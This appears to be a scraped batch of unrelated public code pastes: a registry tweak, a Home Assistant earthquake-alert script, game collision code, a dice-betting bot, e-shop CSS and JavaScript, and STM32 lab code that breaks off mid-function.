QJq199y6,Enable AMD Video Upscale.reg,neil_tohno,REG,Friday 24th of May 2024 04:15:52 AM CDT,"Windows Registry Editor Version 5.00

;original post, https://forums.guru3d.com/threads/.450964/page-4#post-6201618

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000]
""videoupscale_runtime_component_na""=""false""

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000\UMD\DXVA]
""VideoUpScaleValue""=hex:01,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00
""SharpnessValue""=hex:00,00,00,00,00,00,00,00,88,13,00,00,00,00,00,00"
D6zeWJxR,HA earthquake notify shell script,xangin,Bash,Friday 24th of May 2024 03:58:07 AM CDT,"#!/bin/bash

#‰øÆÊîπÊàêËá™Â∑±HAÁöÑIP:PORTÔºåÊ≥®ÊÑèÁ≠âËôüÂ∑¶Âè≥‰∏çËÉΩÊúâÁ©∫Ê†ºÂî∑!!
DST=http://192.168.XXX.XXX:8123

#Ëß∏ÁôºHAÁöÑwebhook‰ª•Âü∑Ë°åËá™ÂãïÂåñ
curl -X POST \
  -H ""Content-Type: application/json"" \
  -d ""{ \""level\"": \""$1\"" , \""seconds\"": \""$2\"" }"" \
  $DST/api/webhook/trigger_ea_cmd

#line notifyÊ¨äÊùñÔºåÈ†≠Â∞æÂºïËôüÂãøÂà™Èô§ÔºåÂºïËôüË£°Èù¢‰∏çËÉΩÊúâÁ©∫Ê†º
line_token=""REPLACE_WITH_YOUR_TOKEN""

#ÈÄöÁü•ÂÖßÂÆπ
msg=""Ë≠¶Âëä!!ËäÆÊ∞èË¶èÊ®°$1ÁöÑÂú∞ÈúáÔºåÂ∞áÊñº$2ÁßíÂæåÂà∞ÈÅî!!""

#Êà™ÂúñÊåá‰ª§
VNC=:0 gnome-screenshot -w -f /config/oxwu/OX.png

#ÁôºÈÄÅlineÈÄöÁü•
curl -X POST https://notify-api.line.me/api/notify \
  -H ""Authorization: Bearer ""$line_token \
  -F ""message=${msg}"" \
  -F ""imageFile=@/config/oxwu/OX.png""

#Á≠âÂæÖ1Áßí
sleep 1s

#Âà™Èô§Êà™Âúñ
rm -f /config/oxwu/OX.png"
bwETJqyt,HA earthquake alert automation2,xangin,YAML,Friday 24th of May 2024 03:37:40 AM CDT,"- id: '1714012563709'
  alias: earthquake_automation2
  description: Âú∞ÈúáÈ†êÂ†±ÈÄöÁü•2
  mode: single
  trigger:
  - platform: webhook
    allowed_methods:
    - POST
    local_only: true
    webhook_id: trigger_ea_cmd
  condition: []
  action:
  - variables:
      lv: '{{ trigger.json.level[:1] | int }}'
      time: '{{ trigger.json.seconds }}'
  - if:
    - condition: template
      value_template: '{{ lv >2 }}'
      alias: Âú∞ÈúáÊòØÂê¶Â§ßÊñº2Á¥ö
    then:
    - alias: ÊâìÈñãÈõªÁáà
      service: switch.turn_on
      data: {}
      target:
        entity_id:
        - switch.guest_room
        - switch.living_room
    - alias: ÊâìÈñãGoogleÈü≥ÁÆ±
      service: media_player.turn_on
      data: {}
      target:
        entity_id:
        - media_player.guest_room_mini
    - alias: Ê†πÊìöÈúáÂ∫¶Ë®≠ÂÆöGoogleÈü≥ÁÆ±Èü≥Èáè
      service: media_player.volume_set
      data:
        entity_id:
        - media_player.guest_room_mini
        volume_level: '{{ 0.1*lv }}'
    - alias: GoogleÈü≥ÁÆ±Êí≠ÊîæË®äÊÅØ
      service: tts.edge_tts_say
      data:
        entity_id:
        - media_player.guest_room_mini
        message: Ë≠¶Âëä!{{ lv }}Á¥öÂú∞ÈúáÂ∞áÂú®{{ time }}ÁßíÂæåÊäµÈÅî"
LkEzFRXA,section of the player collision detection thing as of 2024-05-24,Kitomas,C++,Friday 24th of May 2024 03:31:11 AM CDT,"bool Player::colliding(shape::rect thing_rect, shape::fpoint* target_p){
  //convert the 2 rects from x,y,w,h to x0,y0,x1,y1
  thing_rect.w += thing_rect.x; //convert width and height to a second point
  thing_rect.h += thing_rect.y;  //that defines the thing's bounding box

   //(size of the bounding box, anyway)
  shape::point player_size(RND(6.0f*scale), RND(8.0f*scale));

  shape::rect player_rect;
  player_rect.x = RND(pos.x)    - player_size.x/2;
  player_rect.y = RND(pos.y)    - player_size.y/2;
  player_rect.w = player_rect.x + player_size.x  ;
  player_rect.h = player_rect.y + player_size.y  ;



  //detect collision while getting the area of intersection
  shape::rect inter_rect; //inter[section]
  inter_rect.x = MAX(player_rect.x, thing_rect.x); //max of left edges
  inter_rect.y = MAX(player_rect.y, thing_rect.y); //max of top edges
  inter_rect.w = MIN(player_rect.w, thing_rect.w); //min of right edges
  inter_rect.h = MIN(player_rect.h, thing_rect.h); //min of bottom edges

  bool collision = inter_rect.x < inter_rect.w  &&  inter_rect.y < inter_rect.h;

  //forward declare some stuff so msvc doesn't complain about me using gotos
  shape::fpoint thing_center;
  shape::fpoint target; //'where should the player have to move to avoid thing?'
  bool horizontal; //'should player be displaced vertically or horizontally?'
  if(!collision) goto _draw_collisions_;



  thing_center.x = (f32)(thing_rect.x + thing_rect.w)/2;
  thing_center.y = (f32)(thing_rect.y + thing_rect.h)/2;

#if defined(_DEBUG) && defined(SHOW_COLLISIONS)
  if(thing_center.x > pos.x) inter_rect.w  = -(inter_rect.w - inter_rect.x);
  else                       inter_rect.w -= inter_rect.x;
  if(thing_center.y > pos.y) inter_rect.h  = -(inter_rect.h - inter_rect.y);
  else                       inter_rect.h -= inter_rect.y;
#endif /* if defined(_DEBUG) && defined(SHOW_COLLISIONS) */



  thing_center -= pos; //get position of thing relative to the player

  //'should player be displaced vertically or horizontally?'
  horizontal = fabsf(thing_center.x) >= fabsf(thing_center.y);

  //to prevent the player from potentially getting stuck due to rounding errors
  #define EPSILON 0.0001f

  if(horizontal){
    if(thing_center.x>0) target.x = thing_rect.x-(3.0f*scale)-EPSILON; //push left
    else                 target.x = thing_rect.w+(3.0f*scale)+EPSILON; //push right

  } else { //vertical
    if(thing_center.y>0) target.y = thing_rect.y-(4.0f*scale)-EPSILON; //push up
    else                 target.y = thing_rect.h+(4.0f*scale)+EPSILON; //push down

  }

  if(target_p) *target_p = target;

  //_printf(""%5.2f, %5.2f\n"", delta.x, delta.y);
  _printf(""%3i, %3i, %3i, %3i\n"", thing_rect.x, thing_rect.y, thing_rect.w, thing_rect.h);



  _draw_collisions_:
#if defined(_DEBUG) && defined(SHOW_COLLISIONS)

  //(make sure inter_rect's width and height is positive)
  if(inter_rect.w < 0) inter_rect.w = -inter_rect.w;
  if(inter_rect.h < 0) inter_rect.h = -inter_rect.h;
  if(collision) gl_win->drawRectangles(&inter_rect, 1, 0x007fff);


  shape::point p[5];
  shape::point thing_center_s32;
  thing_center_s32.x = (thing_rect.x + thing_rect.w)/2;
  thing_center_s32.y = (thing_rect.y + thing_rect.h)/2;

  if(collision){
    p[0] = shape::point(thing_center_s32.x, thing_center_s32.y);
    p[1] = shape::point(thing_rect.x  , thing_rect.y  );
    p[2] = shape::point(thing_rect.w-1, thing_rect.y  );
    p[3] = shape::point(thing_rect.x,   thing_rect.h-1);
    p[4] = shape::point(thing_rect.w-1, thing_rect.h-1);
    gl_win->drawLines((shape::point*)&p, 2, 0xffffff); p[1] = p[2];
    gl_win->drawLines((shape::point*)&p, 2, 0xffffff); p[1] = p[3];
    gl_win->drawLines((shape::point*)&p, 2, 0xffffff); p[1] = p[4];
    gl_win->drawLines((shape::point*)&p, 2, 0xffffff);
  }


  p[0] = shape::point(thing_rect.x  , thing_rect.y  );
  p[1] = shape::point(thing_rect.w-1, thing_rect.y  );
  p[3] = shape::point(thing_rect.x,   thing_rect.h-1);
  p[2] = shape::point(thing_rect.w-1, thing_rect.h-1);
  p[4] = p[0];
  //gl_win->drawPoints((shape::point*)&p, lengthof(p,shape::point),
  //                   (collision) ? 0xff00 : 0xff0000, true);
  gl_win->drawLines((shape::point*)&p, lengthof(p,shape::point),
                    (collision) ? 0xff00 : 0xff0000, 1);


  p[0] = shape::point(player_rect.x  , player_rect.y  );
  p[1] = shape::point(player_rect.w-1, player_rect.y  );
  p[3] = shape::point(player_rect.x  , player_rect.h-1);
  p[2] = shape::point(player_rect.w-1, player_rect.h-1);
  p[4] = p[0];
  //gl_win->drawPoints((shape::point*)&p, lengthof(p,shape::point),
  //                   (collision) ? 0xff00 : 0xff0000, true);
  gl_win->drawLines((shape::point*)&p, lengthof(p,shape::point),
                    (collision) ? 0xff00 : 0xff0000, 1);


  if(collision){
    p[0] = shape::point(thing_center_s32.x, thing_center_s32.y);
    p[1] = shape::point((s32)pos.x, (s32)pos.y);
    gl_win->drawLines((shape::point*)&p, 2, (horizontal) ? 0x00ffff : 0xffff00);
    gl_textf((s32)gl_player.pos.x + PLAYER_HALF,
             (s32)gl_player.pos.y - PLAYER_HALF,
             ""horizontal=%s"", boolStr(horizontal));
  }

#endif /* if defined(_DEBUG) && defined(SHOW_COLLISIONS) */


  return collision;

}"
Ru4BxyaG,amazing snowybot 3.14,coinwalk,JavaScript,Friday 24th of May 2024 03:16:33 AM CDT,"var OriginalBalanCe = parseFloat(document.getElementById('pct_balance').value);
var BaseBet = Number((OriginalBalanCe/1000).toFixed(8))
var NexTBet = BaseBet;
var tens = (BaseBet*10);
var fives = (BaseBet*4.9);
var sevens = (BaseBet*6.9);
var eights = (BaseBet*7.9);
var winnerdinner = (OriginalBalanCe*24);
var snowzy = ((Math.floor(OriginalBalanCe/tens))*tens);
var loL = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowy = 0;
var fart = 1;
var BalanCe = OriginalBalanCe;
 
function go(){
BalanCe = document.getElementById('pct_balance').value;
var dog = Number((BalanCe-OriginalBalanCe).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((BalanCe>(((Math.floor(BalanCe/tens))*tens)+sevens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+eights))&&(BalanCe!=snowy)){
    NexTBet = NexTBet*2;
    snowy = parseFloat(BalanCe);
}
if ((BalanCe<(snowzy-(tens*2)))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))&&(BalanCe<OriginalBalanCe)){
    NexTBet = BaseBet;
    snowy = 0;
    fart = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
    loL = ((Math.floor(OriginalBalanCe/tens))*tens);
}
if ((BalanCe<(snowzy-(tens*2)))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))&&(BalanCe>=OriginalBalanCe)){
    NexTBet = BaseBet;
    snowy = 0;
    fart = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if ((BalanCe>(loL+(tens*fart)))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){ 
    fart = 1;
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
    loL = ((Math.floor(BalanCe/tens))*tens);
}
if (BalanCe>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((NexTBet*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 112);
}
go();"
h8RncEA3,Profecient || Disable Custom Cursor Feature,fauzanjeg,PHP,Friday 24th of May 2024 02:55:31 AM CDT,"/**
 * Disable Custom Cursor in Global Options
 *
 * @param array $options List Options.
 *
 * @return array
 */
function profeceient_disable_global_custom_cursor( $options ) {
	if ( ( $key = array_search( 'Custom_Cursor', $options ) ) !== false ) {
		unset( $options[ $key ] );
	}
	return $options;
}
add_filter( 'profecient_global_options', 'profeceient_disable_global_custom_cursor', 99 );

/**
 * Disable Custom Cursor in each Widgets
 *
 * @param array $options Options.
 *
 * @return array
 */
function profeceient_disable_custom_cursor( $options ) {
	unset( $options['profecient_custom_cursor'] );
	return $options;
}
add_filter( 'profecient_register_custom_options', 'profeceient_disable_custom_cursor', 99 );"
8czcbcVy,curapil.cz - CSS,Webotvurci,CSS,Friday 24th of May 2024 02:42:08 AM CDT,"/* Z√°kladn√≠ styly pro tabulku */
.c-product-interconnection-custom--image-select-list-dropdown {
  width: 100%;
  border-collapse: collapse;
  margin-top: 20px;
}
/* Styly pro z√°hlav√≠ tabulky */
.c-product-interconnection-custom--image-select-list-dropdown th {
  background-color: #f2f2f2;
  color: #333;
  font-weight: bold;
  padding: 10px;
  text-align: left;
  border-bottom: 1px solid #ddd;
}
/* Styly pro bu≈àky tabulky */
.c-product-interconnection-custom--image-select-list-dropdown td {
  padding: 10px;
  border-bottom: 1px solid #ddd;
}
/* Zv√Ωraznƒõn√≠ ≈ô√°dk≈Ø p≈ôi najet√≠ my≈°√≠ */
.c-product-interconnection-custom--image-select-list-dropdown tr:hover {
  background-color: #f5f5f5;
}
/* Responzivn√≠ styly pro mobiln√≠ za≈ô√≠zen√≠ */
@media (max-width: 768px) {
  .c-product-interconnection-custom--image-select-list-dropdown thead {
    display: none;
  }
  .c-product-interconnection-custom--image-select-list-dropdown tbody, .c-product-interconnection-custom--image-select-list-dropdown tr {
    display: block;
    width: 100%;
  }
  .c-product-interconnection-custom--image-select-list-dropdown td {
    display: block;
    text-align: right;
    padding-left: 50%;
    position: relative;
    border-bottom: 0; /* odstran√≠me defaultn√≠ border */
    box-sizing: border-box;
  }
  /* Oddƒõl√≠me ≈ô√°dky pomoc√≠ marginu a borderu */
  .c-product-interconnection-custom--image-select-list-dropdown tr {
    margin-bottom: 10px; /* p≈ôid√°me prostor mezi ≈ô√°dky */
    border: 1px solid #e6e6e6; /* lehk√Ω border pro oddƒõlen√≠ */
    border-radius: 5px; /* zaoblen√≠ roh≈Ø */
    background: #fff; /* b√≠l√© pozad√≠ pro lep≈°√≠ oddƒõlen√≠ */
  }
  /* Label pro mobiln√≠ zobrazen√≠ */
  .c-product-interconnection-custom--image-select-list-dropdown td::before {
    content: attr(data-label);
    position: absolute;
    left: 10px;
    padding-right: 10px;
    text-align: left;
    font-weight: bold;
    text-transform: uppercase;
    display: inline-block;
    width: 45%;
  }
  /* Upravit styl pro odkazy */
  .c-product-interconnection-custom--image-select-list-dropdown a {
    display: inline-block;
    margin: 5px 0;
    width: calc(100% - 20px);
    text-align: center;
  }
}
/* Styly pro tlaƒç√≠tka a odkazy */
.c-product-interconnection-custom--image-select-list-dropdown a {
  color: #007bff;
  text-decoration: none;
  padding: 5px 10px;
  border: 1px solid #007bff;
  border-radius: 5px;
  transition: all 0.3s ease;
}
.c-product-interconnection-custom--image-select-list-dropdown a:hover {
  background-color: #007bff;
  color: white;
}
table.c-product-interconnection-custom--image-select-list-dropdown > tr:last-child {
  font-weight: 700;
}"
J7m5aNfs,curapil.cz - JS,Webotvurci,JavaScript,Friday 24th of May 2024 02:41:09 AM CDT,"if (dataLayer[0][""shoptet""][""pageType""] == ""productDetail"") {
  let product_id = dataLayer[0][""shoptet""][""product""][""guid""];
  const eshop_id = dataLayer[0][""shoptet""][""projectId""];

  fetch(""https://shoptet.webotvurci.cz/eshop-endpoints/"" + eshop_id + ""/product-variants/setting-hash"")
    .then((response) => response.json())
    .then((response) => {
      var product_connections_setting = ""https://cdn.myshoptet.com/usr/webotvurci.myshoptet.com/user/documents/product-variants/"" + eshop_id + ""/eshopSetting.json?"" + response;
      fetch(product_connections_setting)
        .then((response) => response.json())
        .then((json) => {
          let products = json.products[product_id];
          if (products !== undefined) {
            products.forEach((element) => {
              let product_config_id = element;
              let product_config_data = json.configs[product_config_id];
              WtShowProductInterconnectionsAddonCisBox(product_config_data);
            });
          }

        });
    })
    .catch((error) => {
      console.log(error);
    });
}

function formatNumber(number) {

  const fixedNumber = number.toFixed(2);

  const formatter = new Intl.NumberFormat('cs-CZ', {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });

  return formatter.format(fixedNumber).replace('.', ',');
}

function najdiCenuBezDPH(identifier) {

  const element = document.querySelector(`[data-micro-identifier=""${identifier}""]`);

  if (!element) {
    console.log('Element s dan√Ωm identifik√°torem nebyl nalezen.');
    return null;
  }

  const cenaBezDPHElement = element.querySelector('.price-additional');

  if (!cenaBezDPHElement) {
    console.log('Element s cenou bez DPH nebyl nalezen.');
    return null;
  }

  var rawPriceText = cenaBezDPHElement.textContent.trim();

  var priceText = rawPriceText.replace(/[^\d,]/g, '').trim();

  var formattedPrice = priceText.replace(',', '.');

  return formattedPrice;
}

function WtShowProductInterconnectionsAddonCisBox(product_config_data) {
  var productData = product_config_data;

  if (dataLayer[0][""shoptet""][""pageType""] == ""productDetail"" && typeof productData !== 'undefined') {

    var container;
    container = document.querySelector("".p-detail-info"");

    if (productData.hasOwnDesign === true && productData.type === ""list"") {

      var customSelectBox = document.createElement('div');
      customSelectBox.setAttribute('class', `c-product-interconnection-detail-params--custom is-template--${shoptet.design.template.name}`);

      var itemsContainer = document.createElement('table');
      itemsContainer.setAttribute('class', 'c-product-interconnection-custom--image-select-list-dropdown');
      // Vytvo≈ôen√≠ z√°hlav√≠ tabulky
      var headerRow = document.createElement('tr');
      var headers = [""N√°zev produktu"", ""Poƒçet kus≈Ø"", ""Cena bez DPH"", ""Cena za kus"", ""Odkaz""];
      headers.forEach(headerText => {
        var header = document.createElement('th');
        header.textContent = headerText;
        headerRow.appendChild(header);
      });
      itemsContainer.appendChild(headerRow);
      customSelectBox.appendChild(itemsContainer);

      let product_id = dataLayer[0][""shoptet""][""product""][""guid""];

      for (var key in productData.productsSetting) {
        var item = document.createElement('tr');
        item.setAttribute('class', 'c-product-interconnection-custom--image-select-list-dropdown__item');
        item.dataset.link = productData.productsSetting[key].link;

        var name = productData.productsSetting[key].label;
        var link = productData.productsSetting[key].link;

        var velikostBaleni;
        var pocetKusu;

        if (name === ""1ks"") {
          velikostBaleni = name;
          pocetKusu = 1;
        } else {
          const casti = name.split(""-"");
          velikostBaleni = casti[0].trim();

          pocetKusu = parseInt(casti[1].trim().replace('ks', ''), 10);
        }

        var printPrice = """";
        var printPricePerPiece = """";
        if (key !== product_id) {
          var cenaBezDPH = parseFloat(najdiCenuBezDPH(key));
          printPricePerPiece = formatNumber(cenaBezDPH / parseFloat(pocetKusu));
          printPrice = formatNumber(cenaBezDPH);

        } else {

          var priceElement = document.querySelector('.price-additional');
          var rawPriceText = priceElement.textContent.trim();
          var priceText = rawPriceText.replace(/[^\d,]/g, '').trim();
          var formattedPrice = priceText.replace(',', '.');
          var priceFloat = parseFloat(formattedPrice);
          var pricePerPiece = priceFloat / pocetKusu;
          printPrice = formatNumber(priceFloat);
          printPricePerPiece = formatNumber(pricePerPiece);

        }

        item.innerHTML = `
  <td data-label=""N√°zev produktu"">${velikostBaleni}</td>
  <td data-label=""Poƒçet kus≈Ø"">${pocetKusu} Ks</td>
  <td data-label=""Cena bez DPH"">${printPrice} Kƒç</td>
  <td data-label=""Cena za kus"">${printPricePerPiece} Kƒç</td>
  <td data-label=""Odkaz""><a href=""${link}"">Zobrazit</a></td>
`;


        itemsContainer.appendChild(item);

      }

      if (container) {
        container.parentNode.insertBefore(customSelectBox, container);
      }
    }
  }
}
"
D220VpzF,Untitled,MrViSiOn,JavaScript,Friday 24th of May 2024 02:38:56 AM CDT,"    function emailVerify() {
      let email = document.querySelector('#email').value;
      let re = /[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$/;
      let result = re.test(email);


      //Swap gmail
      let gmailMatch = email.match('@gmail.com');
      if (gmailMatch) {
        let gmailSplit = email.split('@gmail.com');
        let emailParseRemovePlus = gmailSplit[0].split(""+"");
        let emailParseRemoveDot = emailParseRemovePlus[0].replace(/\./g, """");
        let parsedGmail = emailParseRemoveDot.concat('@gmail.com');
        document.querySelector('#emailResult').value = parsedGmail;
      } else if (
        email.indexOf('outlook') > -1 ||
        email.indexOf('hotmail') > -1
      ) {
        let emailOutlookHotmail = email.split('@');
        let emailParseRemovePlus = emailOutlookHotmail[0].split(""+"");
        let parsedOutlookHotmail = emailParseRemovePlus[0].concat('@' + emailOutlookHotmail[1]);
        document.querySelector('#emailResult').value = parsedOutlookHotmail;
      } else {
        // If
        document.querySelector('#emailResult').value = email;
      }


      if (result == true) {
        return true;
      }
      else {
        return false;

      }
    }"
7QtLjUX0,Mousewheel disable,ScottBin,Autohotkey,Friday 24th of May 2024 02:25:25 AM CDT,"#SingleInstance, force
#MaxHotkeysPerInterval 200

#IfWinActive WGT Golf
WheelDown::WheelUp
WheelUp::WheelDown
return

#if
PGDN::Suspend, Toggle

^+x::ExitApp"
DUhbB3T3,dynamic accordion,karstenw,R,Friday 24th of May 2024 02:22:58 AM CDT,"ui <- bslib::page_sidebar(
    sidebar=bslib::sidebar(
        open=""always"",
        position=""right"",
        shiny::selectInput(
            inputId=""acc_title"", 
            label=""Accordion Panel's title"",
            choices=c(""Title 1"", ""Title 2""),
            selected=""Title 1"",
            multiple=FALSE
        )
    ),
    bslib::card(
        ""Some content"",
        bslib::card_footer(
            bslib::accordion(
                id=""acc"",
                open=FALSE,
                multiple=FALSE,
                bslib::accordion_panel(
					value=""acc_panel"", # not ""id""
					""Title 1"",
					""Accordion's content.""
				)
            )
        )
    )
)
server = function(input, output, session) {
    shiny::observeEvent(input$acc_title, {
        bslib::accordion_panel_update( # <-- crucial part
            id=""acc"", 
            target=""acc_panel"",
            title = input$acc_title
        )
    })
}
shiny::runApp(shinyApp(ui, server))"
Vn86zTRQ,marfa,Bobita,C,Friday 24th of May 2024 02:18:06 AM CDT,"/*
 * USART2 is connected to the ST-Link virtual COM port.
 * Use Tera Term to interract with STM board
 *
 * By default, the clock is running at 16 MHz.
 * The UART2 is configured for 115200 Baud.
 * PA2 - USART2 TX (AF7)
 * PA3 - USART2 RX (AF7)
 */
#include ""stm32f4xx.h""
#include <stdio.h>
#include <string.h>

#include ""Types.h""
#include ""Drivers.h""

void delayMs(int);
UART_MSG_T msg = {.data = {0}, .id = 0, .len = 0};
U8 CyclicMessage_U8 = 0;
U8 TimerCountDown_U16 = SECONDS_TO_COUNT_U8;
U8 PrintInCycleMode_U8 = 0;

/* Lucrarea 2 de completat */

void PeriphInit(void)
{

	__disable_irq();

	// Configure PC[11..8] as input
	RCC->AHB1ENR |= 4;			 /* Enable GPIOC clock */
	GPIOC->MODER &= ~0x0CFF0000; /* Reset GPIOC PC[13..9]  for input mode */
	
	RCC->AHB1ENR |= 1; /* porneste semnalul de tact al portului A */
	GPIOA->MODER &= ~0x00000C00; /* sterge registrul de mod al portului A */
	GPIOA->MODER |= 0x00000400; /* seteaza modul de iesire al pinului PA5 */

	RCC->AHB1ENR |=  2;             /* enable GPIOB clock */
  GPIOB->MODER &= ~0x0000ff00;    /* clear pin mode */
  GPIOB->MODER |=  0x00005500;    /* set pins to output mode */

	USART2_init();

	__enable_irq();
}

/* TODO: change the 0's to the correct value */
const U8 Hex7Segment[16] = {0};

/* end lucrarea 2*/

/* Lucrarea 3 De completat*/
static const U32 STRVR = 0;
static const U16 STCTRL = 0;

static const U16 TIM3_PSC = 0;
static const U16 TIM3_ARR = 0;

static const U16 TIM3_CH1_PSC = 0;
static const U16 TIM3_CH1_ARR = 0; 
static const U16 TIM3_CH1_CCMR1 = 0;
static const U16 TIM3_CH1_CCR1 = 0;

static const U16 TIM8_CH3_PSC = 0; 
static const U16 TIM8_CH3_CCMR2 = 0;

U32 timestamp = 0;
U32 capture_time = 0;
U8 nr_of_pushes = 0;
U8 factor = 1;
/* end lucrarea  3 */

/* Lucrarea 4 */

U16 dac_factor = 600;
U16 dac_hold_value = 0;


#define ADC_8_BIT 1 //dezactivati pentru adc 12 biti

#if ADC_8_BIT
static const U32 ADC_CR1 = 0; /* 8-bit resolution */
static const U32 ADC_CR2 = 0; /* SW Start, Align right justified, start adc */
#else 
static const U32 ADC_CR1 = 0; /* 12-bit resolution */
static const U32 ADC_CR2 = 0; /* SW Start, Align left justified,  start ADC */
#endif

static const U32 MODER = 0; /* PA0-PA4 ca intrari analogice*/

/*End of Lucrarea 4*/

/* lucrarea 5 */
static const U32 MODER_IRQ_B = 0; /* PB15-PB12 ca intrari*/
static const U32 MODER_IRQ_C = 0; /* PC11-PC8 ca intrari */
static const U32 PUPDR_IRQ_B = 0; /* PB15-PB12 pull-up*/
static const U16 EXTI_FTSR = 0; /* ISR on PB15-PB12 falling edge*/
static const U16 EXTI_RTSR = 0; /* ISR on PC11-PC8 rising edge*/

void IRQInit()
{
	SetupIOInterrupt(MODER_IRQ_B, MODER_IRQ_C, PUPDR_IRQ_B, EXTI_FTSR, EXTI_RTSR);
}
/* end of lucrarea 5 */

/* Lucrarea 6 */
static const U16 SPI_CR1 = 0x33F; /* viteza transfer si 8 biti date, master mode */

static const U32 GPIOB_OTYPER = 0; /* set as open drain */
static const U32 GPIOB_PUPDR = 0;	/* setup SCL, SDA ca pull-up pentru I2C*/
static const U16 I2C_CR1 = 0;			/* SW resetm ie;ire reset, enable I2C1*/
static const U16 I2CC_CCR = 0;				/* setup as standard mode*/
/* end Lucrarea 6 */

U8 ReceiveMessage(void)
{
	char msg_str[MAX_PACKET_STR_SIZE];
	const char *pos = msg_str;

	memset(&msg, 0, sizeof(UART_MSG_T));

	fgets(msg_str, MAX_PACKET_STR_SIZE, stdin);

	if (strlen(msg_str) < 3)
	{
		msg.id = 0xFF;
		return 0;
	}

	if (sscanf(pos, ""%2hhx"", &msg.id) == 0)
	{
		msg.id = 0xFF;
		return 0;
	}

	if (strlen(msg_str) > 5)
	{
		pos += 3;

		for (int i = 1; i < strlen(msg_str) / 3; i++)
		{
			sscanf(pos, ""%2hhx"", &msg.data[i - 1]);
			pos += 3;
			msg.len++;
		}
	}
	return 1;
}

void PrintReceivedMessage(const UART_MSG_T msg)
{
	printf(""the received packet is: \n"");
	printf(""ID: %02x \n"", msg.id);
	printf(""Size in Bytes: %d\n"", msg.len);
	printf(""Data:"");
	for (int i = 0; i < msg.len; i++)
		printf(""%02X "", msg.data[i]);
	printf(""\r\n"");
}

void ProcessMessage(const UART_MSG_T msg)
{
	U32 p;
	switch (msg.id)
	{
	case SW_VERSION:
		printf(""SW Version: 01.03.24-SI\n"");
		break;

	case PORT_INPUT:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] != 0x42 && msg.data[0] != 0x43)
		{
			printf(""bad-port\n"");
		}
		else if (((msg.data[0] == 0x42) && (msg.data[1] > 15 || msg.data[1] < 12)) ||
				 ((msg.data[0] == 0x43) && (msg.data[1] > 11 || msg.data[1] < 8)))
		{
			printf(""bad-pin\n"");
		}
		else
		{
			U32 i = 1;
			p = msg.data[0] != 0x42 ? GPIOC->IDR : GPIOB->IDR;
			i <<= msg.data[1];
			if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
			{
				printf(""%ld \n"", (p & i) >> msg.data[1]);
				PrintInCycleMode_U8 = 0;
			}

			if (CyclicMessage_U8 == 0 && msg.len >= 3)
			{
				if (msg.data[2] > 0)
				{
					CyclicMessage_U8 = 1;
					InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
				}
			}
		}

		break;
	case PORT_OUTPUT:
		if (msg.len < 3)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] != 0x42)
		{
			printf(""bad-port\n"");
		}
		else if ((msg.data[1] > 7) || (msg.data[1] < 4))
		{
			printf(""bad-pin\n"");
		}
		else
		{
			U32 i = 1;
			i <<= msg.data[1];
			GPIOB->BSRR = msg.data[2] ? (GPIOB->BSRR | i) : (GPIOB->BSRR | (i << 16));
			printf(""%02lX\n"", (GPIOB->ODR & 0x000000F0) >> 4);
		}
		break;
	case PORT_HEX:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] > 3)
		{
			printf(""bad-display\n"");
		}
		else if (msg.data[1] > 15)
		{
			printf(""bad-number\n"");
		}
		else
		{

			SPI1_init();
			SPI1_write(Hex7Segment[msg.data[1]]); /* write pattern to the seven segments */
			SPI1_write(1 << msg.data[0]);		  /* select digit */
		}
		break;
	case TIMERS:
		if (msg.len < 1)
		{
			printf(""bad-len\n"");
		}
		else
		{
			SystemTickTimerStop();
			switch (msg.data[0])
			{
			/*general timer */
			case GENERAL_TIM3:
				if (CyclicMessage_U8 == 0)
				{
					TIM3_Cfg(TIM3_PSC, TIM3_ARR);
					timestamp = 0;

					if (msg.len > 1)
					{
						TIM3->ARR = ((TIM3->ARR + 1) * msg.data[1]) - 1;
						factor = msg.data[1];
					}
				}
				if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
				{
					printf(""%ld \n"", timestamp);
					PrintInCycleMode_U8 = 0;
				}

				if (CyclicMessage_U8 == 0 && msg.len >= 3)
				{
					if (msg.data[2] > 0)
					{
						CyclicMessage_U8 = 1;
						InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
					}
					else
					{
						TIM3_Stop();
					}
				}
				break;
			/* out compare */
			case TIM3_CH1_COMPARE:
				TIM3_CH1_Compare_Cfg(TIM3_CH1_PSC, TIM3_CH1_ARR, TIM3_CH1_CCMR1, TIM3_CH1_CCR1);
				if (msg.len > 1)
				{
					TIM3->ARR = TIM3->ARR * msg.data[1];
				}
				break;
			/* in capture */
			case TIM8_CH3_CAPTURE:
				if (CyclicMessage_U8 == 0)
				{
					TIM8_CH3_Capture_Cfg(TIM8_CH3_PSC, TIM8_CH3_CCMR2);
					capture_time = 0;
				}

				if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
				{
					printf(""%d %ld \n"", nr_of_pushes, capture_time);
					PrintInCycleMode_U8 = 0;
				}

				if (CyclicMessage_U8 == 0 && msg.len >= 2)
				{
					if (msg.data[1] > 0)
					{
						CyclicMessage_U8 = 1;
						InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
					}
					else
					{
